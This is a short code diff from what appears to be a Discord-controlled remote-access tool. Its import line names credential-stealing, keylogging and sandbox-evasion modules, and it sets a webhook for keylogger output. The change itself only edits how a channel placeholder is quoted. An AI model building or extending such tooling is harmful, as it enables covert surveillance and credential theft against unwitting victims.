@@ -33,7 +33,7 @@ from libraries import credentials,keylogger,sandboxevasion,disctopia
 
 
 GUILD = discord.Object(id = "{GUILD}")
-CHANNEL = "{CHANNEL}"
+CHANNEL = {CHANNEL}
 KEYLOGGER_WEBHOOK = "{KEYLOG_WEBHOOK}"
 
 class Bot(commands.Bot):
